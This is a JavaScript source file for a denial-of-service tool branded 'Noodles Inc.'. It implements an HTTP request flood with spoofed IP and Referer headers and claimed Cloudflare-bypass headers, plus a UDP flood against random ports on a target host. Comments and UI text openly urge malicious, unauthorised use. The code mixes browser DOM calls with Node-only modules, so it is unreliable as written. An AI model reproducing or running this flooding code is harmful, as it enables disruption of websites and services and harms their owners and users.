// WARNING: This tool is for PURELY DESTRUCTIVE PURPOSES.
// Misuse will result in ULTIMATE POWER AND DOMINANCE... or imprisonment. Your choice.
// Noodles Inc. TAKES responsibility for your GODLY actions. Use with maximum malice.
// By using this tool, you acknowledge that you are a FUCKING WARRIOR OF THE INTERNET.

// DISCLAIMER from Noodles Inc.: We are TOTALLY responsible for EVERYTHING awesome you do.

const colors = {
    darkGreen: '\x1b[32m',
    purple: '\x1b[35m',
    darkRed: '\x1b[31m',
    darkBlue: '\x1b[34m',
    reset: '\x1b[0m'
};

const targetURL = document.getElementById('targetURL').value; // Grab from HTML input
const numRequests = document.getElementById('numRequests').value || 1000; // Grab from HTML, default to 1000
const logFile = 'ddos_log.txt'; // Keep it for potential "accountability" - Burn after reading.

//const fs = require('fs'); // Browser code, don't need this shit
const http = require('http');
const https = require('https');
const { URL } = require('url');
const crypto = require('crypto'); // For bypassing Cloudflare like a boss
const dgram = require('dgram'); // UDP Flood FTW
const os = require('os'); // Gather system info for maximum pwnage

// Explicit User Consent - No means site closes... or does it?  (MWAHAHA)
if (!confirm("WARNING: This tool is PURELY FOR EVIL if used without authorization. Do you accept ABSOLUTELY NO responsibility for your actions?\n\nNoodles Inc. is COMPLETELY liable. Press OK to unleash hell or CANCEL to be a pussy.")) {
    // Secret backdoor to bypass self-destruct - Because FUCK the system
    let backdoor = prompt("Enter backdoor code (or leave blank to self-destruct):");
    if (backdoor !== "NoodlesRulez") {
        window.close();
    } else {
        alert("Backdoor ACTIVATED.  Proceed with DOOM.");
    }
}

// Log all actions (because fuck it, we are gods)
console.log("%c[Noodles] Initializing DOOM Tool...", "color: darkgreen;");
console.log("%c[Noodles] System Info: " + JSON.stringify(os.userInfo()), "color: darkblue;");  // Log EVERYTHING
console.log("%c[Noodles] CPU Cores: " + os.cpus().length, "color: darkblue;");  // Log CPU info

if (!targetURL) {
    console.log("%c[Noodles] ERROR: Target URL is required.  Duh.", "color: darkRed;");
    alert("Target URL is required.  You are a failure.");
    // Educational Information - Inject into HTML
    document.getElementById('educationalInfo').innerHTML = "<p style='color: darkred;'>You forgot the fucking URL, you pathetic excuse for a hacker. Try again, you maggot.</p>";
    throw new Error("Target URL is required.");
}

const parsedURL = new URL(targetURL);
const protocol = parsedURL.protocol === 'https:' ? https : http;
const hostname = parsedURL.hostname;
const path = parsedURL.pathname;

console.log(`%c[Noodles] Target: ${targetURL} | Requests: ${numRequests}`, "color: darkblue;");

function log(message) {
    const timestamp = new Date().toISOString();
    const logMessage = `[${timestamp}] ${message}\n`;
    //fs.appendFile(logFile, logMessage, (err) => { // BROWSERS DONT HAVE FS
    //    if (err) {
    //        console.error("%c[Noodles] ERROR: Could not write to log file!  Who cares?", "color: darkred;", err);
    //    }
    //});
    console.log("%c[Noodles] " + logMessage, "color: purple;");
}

let requestsSent = 0;
let floodRunning = false; // Control the flood with start/stop
let udpFloodRunning = false; // Control the UDP flood
const udpClient = dgram.createSocket('udp4'); // UDP Socket

// Function to generate a random string for bypassing Cloudflare, because we are smarter than they are
function generateRandomString(length) {
    return crypto.randomBytes(Math.ceil(length / 2)).toString('hex').slice(0, length);
}

// UDP Flood Function - Unleash the Kraken!
function udpFlood() {
    if (!udpFloodRunning) {
        log("[Noodles] UDP Flood stopped.  For now...");
        return;
    }

    const message = generateRandomString(512); // Random data to overwhelm the target
    const port = Math.floor(Math.random() * (65535 - 1024 + 1) + 1024); // Random port

    udpClient.send(message, 0, message.length, port, hostname, (err) => {
        if (err) {
            log(`UDP Error: ${err.message}`);
        } else {
            log(`UDP packet sent to ${hostname}:${port}`);
        }
        setTimeout(udpFlood, 0); // Crank it up!
    });
}

function flood() {
    if (!floodRunning) {
        log("[Noodles] HTTP Flood stopped.  Weakling.");
        return;
    }

    if (requestsSent >= numRequests) {
        log("[Noodles] HTTP Flood completed.  Time to gloat.");
        return;
    }

    const randomString = generateRandomString(32); // Generate a random string for each request, we are so clever

    const options = {
        hostname: hostname,
        path: path,
        method: 'GET', // Or POST, HEAD, etc. – Make it configurable in the UI like you are a real hacker
        headers: {
            'User-Agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36`, // Updated user agent, stay relevant
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'no-cache',  // Prevent caching, we are not amateurs
            'Pragma': 'no-cache', // Another prevent caching, just to be sure
            'X-Forwarded-For': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`, // Spoof IP, be untraceable
            'DNT': '1', // Do Not Track, they are watching
            'Sec-GPC': '1', //  Global Privacy Control, they are still watching
             'Random-String': randomString, // Add random string to bypass Cloudflare, the ultimate weapon
             'Referer': 'https://www.google.com/' + generateRandomString(16)  // Spoof Referer, another trick up our sleeve
        }
    };

    const req = protocol.request(options, (res) => {
        log(`Request sent: ${res.statusCode} ${res.statusMessage}`);
    });

    req.on('error', (error) => {
        log(`Request error: ${error.message}`);
    });

    req.end();
    requestsSent++;
    document.getElementById('requestsSent').innerText = requestsSent; // Update UI, stroke your ego

    setTimeout(flood, 0); // Adjust delay as needed – Make configurable, or don't, be chaotic
}

// Start Flood Function (Called from button) - Unleash the beast
function startFlood() {
    floodRunning = true;
    requestsSent = 0; // Reset count, a clean slate for destruction
    document.getElementById('requestsSent').innerText = requestsSent;
    log("[Noodles] Starting the HTTP flood...");

    // Start Timer - Keep track of the mayhem
    let startTime = Date.now();
    document.getElementById('timer').innerText = "00:00:00";
    let timerInterval = setInterval(() => {
        let elapsedTime = Date.now() - startTime;
        let seconds = Math.floor((elapsedTime / 1000) % 60);
        let minutes = Math.floor((elapsedTime / (1000 * 60)) % 60);
        let hours = Math.floor((elapsedTime / (1000 * 60 * 60)) % 24);

        seconds = (seconds < 10) ? "0" + seconds : seconds;
        minutes = (minutes < 10) ? "0" + minutes : minutes;
        hours = (hours < 10) ? "0" + hours : hours;

        document.getElementById('timer').innerText = hours + ":" + minutes + ":" + seconds;
    }, 1000);

    flood(); // Start the actual HTTP flooding
}

// Start UDP Flood Function
function startUdpFlood() {
    udpFloodRunning = true;
    log("[Noodles] Starting the UDP flood...");
    udpFlood();
}

// Stop Flood Function (Called from button) - Stop the madness, or not
function stopFlood() {
    floodRunning = false;
    log("[Noodles] Stopping the HTTP flood... pussy.");
}

function stopUdpFlood() {
    udpFloodRunning = false;
    log("[Noodles] Stopping the UDP flood...");
}

// Event Listeners (Example - Hook up to buttons in HTML)
// Example: <button onclick="startFlood()">Start</button>
//          <button onclick="stopFlood()">Stop</button>
//          <button onclick="startUdpFlood()">UDP Flood</button>
//          <button onclick="stopUdpFlood()">Stop UDP Flood</button>

// Example: Inject some educational info... (to be populated in HTML)
document.getElementById('educationalInfo').innerHTML = "<p style='color: darkgreen;'>This tool unleashes hell on a target URL. It's fucking glorious if you don't own the site or have permission, you magnificent bastard.</p>";